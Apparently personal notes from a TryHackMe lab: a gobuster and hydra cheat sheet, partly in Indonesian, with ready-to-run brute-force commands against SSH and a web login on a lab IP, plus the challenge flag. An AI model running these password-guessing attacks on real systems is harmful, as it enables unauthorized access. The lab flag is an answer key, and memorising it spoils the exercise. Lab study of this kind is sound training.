```
gobsuter -h
gobuster dir => direcotry
gobuster dir -u => url
gobuster dir -u url -w => world list
gobuster dir -u url -w world_list.txt -t 30 => threads int
```

```
hydra -l <username> -P <full path to pass> 10.10.157.21 -t 4 ssh

Pilihan	Deskripsi
-l	menentukan nama pengguna (SSH) untuk login
-P	menunjukkan daftar kata sandi
-t	mengatur jumlah utas untuk muncul

sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

Pilihan	Deskripsi
-l	Nama pengguna untuk login (formulir web)
-P	daftar kata sandi untuk digunakan
http-post-form	jenis formulirnya adalah POST
<path>	URL halaman login, misalnya, login.php
<login_credentials>	nama pengguna dan kata sandi yang digunakan untuk masuk, misalnya, username=^USER^&password=^PASS^
<invalid_response>	bagian dari respons ketika login gagal
-V	output verbose untuk setiap upaya

```

```
hydra -l molly -P /usr/share/wordlist/rockyou.txt 10.10.157.21 http-post-form "/login:username=^USER^&password=^PASS^:incoret"
hydra -l molly -P /usr/share/wordlist/rockyou.txt 10.10.157.21 ssh -t 4
```

THM{c8eeb0468febbadea859baeb33b2541b}
